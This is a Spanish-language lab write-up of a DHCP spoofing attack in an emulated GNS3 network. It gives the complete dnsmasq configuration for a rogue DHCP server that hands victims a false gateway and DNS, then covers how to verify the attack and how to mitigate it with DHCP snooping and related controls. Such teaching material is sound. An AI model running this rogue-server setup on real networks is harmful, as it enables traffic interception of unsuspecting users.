# 🛠️ Laboratorio: Ataque DHCP Spoofing en GNS3

 Descripción
Este laboratorio demuestra un ataque de **DHCP Spoofing** utilizando **Kali Linux** como atacante y un **router Cisco c7200** como servidor DHCP legítimo dentro de GNS3.  
El objetivo es mostrar cómo un atacante puede suplantar al servidor DHCP y entregar parámetros falsos a las víctimas.

---

 Topología
- **Router c7200** → Servidor DHCP legítimo (pool de direcciones reales).
- **Kali Linux** → Atacante con `dnsmasq` configurado como servidor DHCP falso.
- **VPCS** → Víctima que solicita dirección IP vía DHCP.
- **Switch Ethernet** → Conecta todos los dispositivos en la misma red.

---

Configuración del atacante (Kali con dnsmasq)
1. Instalar dnsmasq:
   ```bash
   sudo apt install dnsmasq
Vaciar y sobrescribir el archivo de configuración:

bash
sudo tee /etc/dnsmasq.conf > /dev/null <<EOF
interface=eth0
dhcp-range=10.24.62.100,10.24.62.150,12h
dhcp-option=3,10.24.62.254      # Gateway falso
dhcp-option=6,8.8.8.8           # DNS falso
EOF
Reiniciar el servicio:

bash
sudo systemctl restart dnsmasq
sudo systemctl status dnsmasq
💻 Comprobación del ataque
Antes del ataque (víctima recibe IP legítima del router):

Código
VPCS> ip dhcp
VPCS> show ip
→ Dirección IP dentro del pool legítimo.

Durante el ataque (Kali responde con parámetros falsos):

Código
VPCS> ip dhcp -r
VPCS> ip dhcp
VPCS> show ip
→ Dirección IP del rango falso, con gateway/DNS incorrectos.

Wireshark: Captura en el enlace de la víctima muestra respuestas DHCP provenientes de Kali.

Mitigación en redes reales
DHCP Snooping → Solo permite respuestas de servidores autorizados.

IP Source Guard → Bloquea tráfico de IPs no legítimas.

Dynamic ARP Inspection (DAI) → Evita ataques MITM combinados.

Segmentación VLAN → Aislar servidores DHCP en VLANs específicas.

ACLs → Limitar quién puede enviar respuestas DHCP.

Ejemplo en Cisco IOS:

bash
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 10
Switch(config)# interface FastEthernet0/1
Switch(config-if)# ip dhcp snooping trust
